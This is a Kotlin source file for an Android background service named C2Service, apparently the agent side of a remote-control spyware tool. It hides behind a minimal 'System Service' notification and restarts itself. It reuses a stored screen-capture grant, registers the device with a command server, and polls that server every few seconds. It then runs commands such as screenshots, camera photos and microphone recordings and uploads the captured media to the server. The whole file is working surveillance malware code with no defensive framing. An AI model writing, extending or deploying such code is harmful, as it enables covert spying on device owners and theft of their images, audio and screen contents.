package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class C2Service : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }
    private lateinit var serverUrl: String

    // Live MediaProjection shared across screenshots
    @Volatile private var projection: MediaProjection? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotification())
        serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
            .getString("server_url", BuildConfig.C2_URL)!!
        tryInitProjection()
        scope.launch { registerLoop() }
        scope.launch { pollLoop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Retry projection init whenever service is restarted
        if (projection == null) tryInitProjection()
        return START_STICKY
    }

    private fun tryInitProjection() {
        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
        val resultCode = prefs.getInt("proj_code", Int.MIN_VALUE)
        val dataStr = prefs.getString("proj_data", null)
        if (resultCode == Int.MIN_VALUE || dataStr == null) return

        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projData = Intent.parseUri(dataStr, 0)
            val proj = mpm.getMediaProjection(resultCode, projData)
            if (proj == null) return

            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    projection = null
                }
            }, android.os.Handler(android.os.Looper.getMainLooper()))

            projection = proj
        } catch (_: Exception) {
            projection = null
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel("c2", "System", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, "c2")
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private suspend fun registerLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val info = DeviceInfo.snapshot(this, deviceId)
                postJson("$serverUrl/api/agent/register", info)
            } catch (_: Exception) {}
            delay(30_000)
        }
    }

    private suspend fun pollLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val body = JSONObject().put("device_id", deviceId)
                val resp = postJson("$serverUrl/api/agent/poll", body)
                val cmds = resp?.optJSONArray("commands") ?: JSONArray()
                for (i in 0 until cmds.length()) {
                    val cmd = cmds.getJSONObject(i)
                    scope.launch { execute(cmd) }
                }
            } catch (_: Exception) {}
            delay(5_000)
        }
    }

    private suspend fun execute(cmd: JSONObject) {
        val id = cmd.getInt("id")
        val type = cmd.getString("type")
        val args = cmd.optJSONObject("args") ?: JSONObject()
        val result = try {
            when (type) {
                "screenshot" -> {
                    val p = projection
                    if (p == null) JSONObject().put("error", "projection_not_ready")
                    else Screenshot.capture(this, p)
                }
                else -> CommandExecutor.run(this, type, args)
            }
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "unknown")
        }

        val payload = JSONObject()
            .put("command_id", id)
            .put("device_id", deviceId)
            .put("success", !result.has("error"))
            .put("result", result)
        try { postJson("$serverUrl/api/agent/result", payload) } catch (_: Exception) {}

        val dataB64 = result.optString("data_b64", "")
        if (dataB64.isNotEmpty()) {
            val category = when (type) {
                "screenshot" -> "screenshot"
                "camera_photo" -> "camera"
                "mic_record" -> "mic"
                else -> "misc"
            }
            val ext = when (type) {
                "screenshot", "camera_photo" -> "jpg"
                "mic_record" -> "m4a"
                else -> "bin"
            }
            try {
                Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.$ext")
            } catch (_: Exception) {}
        }
    }

    private suspend fun postJson(url: String, body: JSONObject): JSONObject? =
        withContext(Dispatchers.IO) {
            val req = Request.Builder()
                .url(url)
                .addHeader("X-Api-Key", BuildConfig.API_KEY)
                .post(body.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { r ->
                r.body?.string()?.let { JSONObject(it) }
            }
        }

    override fun onDestroy() {
        try { projection?.stop() } catch (_: Exception) {}
        projection = null
        scope.cancel()
        super.onDestroy()
    }
}
